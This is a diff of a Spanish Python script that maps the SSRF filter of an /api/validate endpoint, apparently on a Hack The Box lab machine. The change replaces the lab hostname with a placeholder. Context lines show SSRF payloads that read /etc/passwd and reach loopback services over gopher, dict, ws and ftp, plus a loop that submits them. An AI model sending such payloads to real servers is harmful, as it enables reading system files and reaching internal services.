@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-filtro.py - Delimitador del filtro SSRF de POST https://cohort.htb/api/validate
+filtro.py - Delimitador del filtro SSRF de POST https://domain/api/validate
 
 Uso basico:
     python3 filtro.py --only control,privados
@@ -184,7 +184,7 @@ CATEGORIAS: Dict[str, Dict[str, Any]] = {
             "file:///etc/passwd",
             "file:///etc/hostname",
             "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0A%0A",
-            "data:text/plain,cohort",
+            "data:text/plain,domain",
             "dict://127.0.0.1:11211/stat",
             "ws://127.0.0.1/",
             "ftp://127.0.0.1/",
@@ -334,7 +334,7 @@ def sondear(cat: str, payload: str, cfg: argparse.Namespace) -> Resultado:
     cuerpo = {"url": payload, "format": "csv"}
     intentos = 0
     reintento_largo = False
-# preparar url a probar, enviar a server cohort.htb
+# preparar url a probar, enviar a server domain
 # esperar respuesta, medir cuanto tarda
 # interpretar resultado y guardar en Resultado.
     while True:
@@ -551,8 +551,8 @@ def construir(attacker: str, box: str) -> Dict[str, List[str]]:
 # argumentos de linea de comandos
 def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
     p = argparse.ArgumentParser(
-        description="Delimita el filtro SSRF de POST /api/validate (cohort.htb)")
-    p.add_argument("--url-base", default="https://cohort.htb")
+        description="Delimita el filtro SSRF de POST /api/validate (domain)")
+    p.add_argument("--url-base", default="https://domain")
     p.add_argument("--threads", type=int, default=5)
     p.add_argument("--timeout", type=float, default=25.0,
                    help="read timeout del cliente; el backend corta a ~6.4s, manten >= 3x")
